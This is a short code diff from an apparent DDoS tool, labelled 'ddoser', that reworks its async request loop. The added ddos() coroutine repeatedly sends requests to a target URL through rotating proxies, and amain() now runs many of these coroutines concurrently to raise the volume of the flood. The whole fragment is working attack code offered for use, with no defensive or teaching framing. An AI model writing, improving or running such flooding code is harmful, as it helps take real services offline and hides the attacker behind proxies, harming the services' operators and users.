@@ -44,14 +44,18 @@ def get_proxy(proxy_iterator: Iterable[str]) -> str:
         return None
 
 
+async def ddos(target_url: str, timeout: int, count: int, verbose: bool, proxy_iterator: Iterable[Tuple[str, str, int]]):
+    for _ in range(count):
+        proxy = get_proxy(proxy_iterator)
+        await make_request(target_url, proxy, verbose, timeout)
+
+
 async def amain(target_url: str, timeout: int, concurrency: int, count: int, verbose: bool, proxies: List[Tuple[str, str, int]]):
-    for _1 in range(count):
-        coroutines = []
-        proxy_iterator = cycle(proxies or [])
-        for _2 in range(concurrency):
-            proxy = get_proxy(proxy_iterator)
-            coroutines.append(make_request(target_url, proxy, verbose, timeout))
-        await asyncio.gather(*coroutines)
+    coroutines = []
+    proxy_iterator = cycle(proxies or [])
+    for _ in range(concurrency):
+        coroutines.append(ddos(target_url, timeout, count, verbose, proxy_iterator))
+    await asyncio.gather(*coroutines)
 
 
 @click.command(help="Run ddoser")
